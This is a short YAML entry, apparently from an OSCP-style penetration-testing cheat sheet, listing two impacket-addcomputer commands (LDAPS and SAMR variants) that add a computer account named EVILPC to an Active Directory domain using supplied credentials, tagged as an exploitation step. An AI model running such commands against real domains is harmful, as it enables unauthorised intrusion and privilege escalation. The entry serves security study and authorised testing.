---
variants:
  - label: ldaps
    command: |
      impacket-addcomputer -dc-ip $IP -method LDAPS -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD
  - label: smb
    command: |
      impacket-addcomputer -dc-ip $IP -method SAMR -computer-pass $NEWPASSWORD -computer-name EVILPC $DOMAIN/$USER:$PASSWORD
description: Add a computer account to the domain, by method.
os: [Linux]
category: [oscp, cli]
service: [LDAP, SMB]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
